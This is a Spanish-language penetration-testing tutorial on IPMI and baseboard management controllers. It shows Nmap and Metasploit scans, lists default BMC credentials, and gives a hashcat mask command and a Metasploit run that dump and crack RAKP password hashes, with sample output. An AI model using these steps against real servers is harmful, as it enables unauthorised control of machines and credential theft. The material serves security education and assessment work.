# IPMI

a Interfaz de Gestión de Plataforma Inteligente (IPMI) es un conjunto de especificaciones estandarizadas para sistemas de gestión de hardware basados en hardware utilizados para la gestión y monitoreo de sistemas. Actúa como un subsistema autónomo y funciona de manera independiente del BIOS, CPU, firmware y sistema operativo subyacente del host. IPMI proporciona a los administradores del sistema la capacidad de gestionar y monitorear sistemas incluso si están apagados o en un estado no respondiente. Opera utilizando una conexión de red directa al hardware del sistema y no requiere acceso al sistema operativo a través de un shell de inicio de sesión. IPMI también se puede utilizar para actualizaciones remotas de sistemas sin requerir acceso físico al host objetivo. IPMI se utiliza comúnmente de las siguientes maneras:

* Antes de que el sistema operativo se haya iniciado para modificar la configuración del BIOS.
* Cuando el host está completamente apagado.
* Acceso a un host después de una falla del sistema.

Cuando no se usa para estas tareas, IPMI puede monitorear una variedad de cosas, como temperatura del sistema, voltaje, estado de los ventiladores y suministros de energía. También se puede utilizar para consultar información de inventario, revisar registros de hardware y alertar mediante SNMP. El sistema host puede estar apagado, pero el módulo IPMI requiere una fuente de alimentación y una conexión LAN para funcionar correctamente.

El protocolo IPMI se publicó por primera vez por Intel en 1998 y ahora es compatible con más de 200 proveedores de sistemas, incluidos Cisco, Dell, HP, Supermicro, Intel y más. Los sistemas que utilizan la versión 2.0 de IPMI pueden ser administrados a través de serial sobre LAN, dando a los administradores la capacidad de ver la salida del consola serial en banda. Para funcionar, IPMI requiere los siguientes componentes:

* **Controlador de Gestión de Placa Base (BMC)** - Un microcontrolador y componente esencial de IPMI.
* **Bus de Gestión de Chasis Inteligente (ICMB)** - Una interfaz que permite la comunicación de un chasis a otro.
* **Bus de Gestión de Plataforma Inteligente (IPMB)** - Extiende el BMC.
* **Memoria IPMI** - Almacena cosas como el registro de eventos del sistema, datos del repositorio, y más.
* **Interfaces de Comunicación** - Interfaces locales del sistema, seriales y LAN, ICMB y Bus de Gestión PCI.

## Identificación del Servicio

IPMI se comunica a través del puerto 623 UDP. Los sistemas que utilizan el protocolo IPMI se llaman Controladores de Gestión de Placa Base (BMCs). Los BMCs suelen estar implementados como sistemas ARM embebidos que ejecutan Linux y se conectan directamente a la placa base del host. Los BMCs están integrados en muchas placas base, pero también se pueden agregar al sistema como una tarjeta PCI. La mayoría de los servidores vienen con un BMC o soportan la adición de un BMC. Los BMCs más comunes que a menudo vemos durante las pruebas de penetración internas son HP iLO, Dell DRAC y Supermicro IPMI. Si podemos acceder a un BMC durante una evaluación, obtendremos acceso completo a la placa base del host y podremos monitorear, reiniciar, apagar o incluso reinstalar el sistema operativo del host. Obtener acceso a un BMC es casi equivalente al acceso físico a un sistema. Muchos BMCs (incluidos HP iLO, Dell DRAC y Supermicro IPMI) exponen una consola de gestión basada en web, algún tipo de protocolo de acceso remoto por línea de comandos, como Telnet o SSH, y el puerto 623 UDP, que es para el protocolo de red IPMI. A continuación se muestra un escaneo de Nmap utilizando el script `ipmi-version` de Nmap para identificar el servicio.

### **Ejemplo de Escaneo con Nmap**

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Resultado del Escaneo**

```less
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí podemos ver que el protocolo IPMI está efectivamente escuchando en el puerto 623, y Nmap ha identificado la versión 2.0 del protocolo. También podemos utilizar el módulo de escaneo de Metasploit `IPMI Information Discovery` (auxiliary/scanner/ipmi/ipmi\_version).

### Escaneo de Versión con Metasploit

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
```

**Opciones del Módulo**

```
Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads
```

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

**Resultado del Escaneo**

```
textCopiar código[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante las pruebas de penetración internas, a menudo encontramos BMCs donde los administradores no han cambiado la contraseña predeterminada. Algunas contraseñas predeterminadas únicas para tener en nuestras hojas de trucos incluyen:

| Producto        | Usuario       | Contraseña                                                                   |
| --------------- | ------------- | ---------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                       |
| HP iLO          | Administrator | cadena aleatoria de 8 caracteres compuesta de números y letras en mayúsculas |
| Supermicro IPMI | ADMIN         | ADMIN                                                                        |

También es esencial probar contraseñas predeterminadas conocidas para CUALQUIER servicio que descubramos, ya que a menudo permanecen sin cambios y pueden llevar a victorias rápidas. Al tratar con BMCs, estas contraseñas predeterminadas pueden darnos acceso a la consola web o incluso acceso a la línea de comandos a través de SSH o Telnet.

## Configuraciones Peligrosas

Si las credenciales predeterminadas no funcionan para acceder a un BMC, podemos recurrir a una falla en el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que se realice la autenticación. Esto puede aprovecharse para obtener el hash de la contraseña de CUALQUIER cuenta de usuario válida en el BMC. Estos hashes de contraseñas se pueden descifrar fuera de línea utilizando un ataque de diccionario con Hashcat en el modo 7300. En el caso de un HP iLO con una contraseña predeterminada de fábrica, podemos usar este comando de ataque con máscara de Hashcat:

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Esto intenta todas las combinaciones de letras mayúsculas y números para una contraseña de ocho caracteres.

No hay una "solución" directa a este problema porque la falla es un componente crítico de la especificación IPMI. Los clientes pueden optar por contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMCs. Es importante no pasar por alto IPMI durante las pruebas de penetración internas (lo vemos durante la mayoría de las evaluaciones) porque no solo a menudo podemos obtener acceso a la consola web del BMC, que es un hallazgo de alto riesgo, sino que hemos visto entornos donde una contraseña única (pero descifrable) se establece y luego se reutiliza en otros sistemas. En una prueba de penetración, obtuvimos un hash de IPMI, lo desciframos fuera de línea con Hashcat y pudimos acceder por SSH a muchos servidores críticos en el entorno como usuario root y obtener acceso a consolas de gestión web para varias herramientas de monitoreo de red.

### Extracción de Hashes con Metasploit

Para recuperar hashes IPMI, podemos usar el módulo de Metasploit `IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval`.

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
```

**Opciones del Módulo**

```
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
```

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

**Resultado de la Extracción**

```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aquí podemos ver que hemos obtenido exitosamente el hash de la contraseña para el usuario ADMIN, y la herramienta pudo descifrarlo rápidamente para revelar lo que parece ser una contraseña predeterminada ADMIN. Desde aquí, podríamos intentar iniciar sesión en el BMC, o, si la contraseña fuera algo más única, verificar la reutilización de contraseñas en otros sistemas. IPMI es muy común en entornos de red ya que los administradores necesitan poder acceder a los servidores de forma remota en caso de una falla o realizar ciertas tareas de mantenimiento que tradicionalmente tendrían que completar físicamente frente al servidor. Esta facilidad de administración viene con el riesgo de exponer hashes de contraseñas a cualquier persona en la red y puede llevar a accesos no autorizados, interrupción del sistema e incluso ejecución remota de código. Verificar IPMI debe ser parte de nuestro libro de jugadas de pruebas de penetración internas para cualquier entorno que evaluemos.
